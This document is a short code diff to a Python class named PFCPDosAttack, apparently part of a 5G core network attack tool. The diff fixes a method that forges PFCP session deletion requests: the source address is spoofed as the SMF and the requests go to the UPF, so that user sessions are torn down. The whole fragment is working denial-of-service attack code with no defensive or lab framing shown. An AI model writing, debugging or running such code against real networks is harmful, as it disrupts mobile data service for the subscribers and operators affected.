@@ -507,22 +507,22 @@ class PFCPDosAttack:
         if not target_seid:
             print("[DoS] No SEID provided for PFCP session deletion")
             return
-        if smf_addr is None:
+        if not smf_addr:
             print("[DoS] No SMF address provided for PFCP session deletion")
             return
         
         
         if self.verbose:
-            print(f"[DoS] Sending PFCP session deletion packet to {smf_addr} with SEID {target_seid}")
+            print(f"[DoS] Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}")
         
-        Ez_PFCP.Send_PFCP_session_deletion_req(seid=target_seid, 
+        Ez_PFCP().Send_PFCP_session_deletion_req(seid=target_seid, 
                                                src_addr=smf_addr, 
-                                               dest_addr=smf_addr, 
-                                               src_port=self.src_port, 
-                                               dest_port=self.dest_port)
+                                               dest_addr=upf_addr, 
+                                               src_port=src_port, 
+                                               dest_port=dest_port)
         
         if self.verbose:
-            print(f"[DoS] PFCP Session Deletion packet sent to {self.smf_addr}")
+            print(f"[DoS] PFCP Session Deletion packet sent to {upf_addr}")
         
 
 
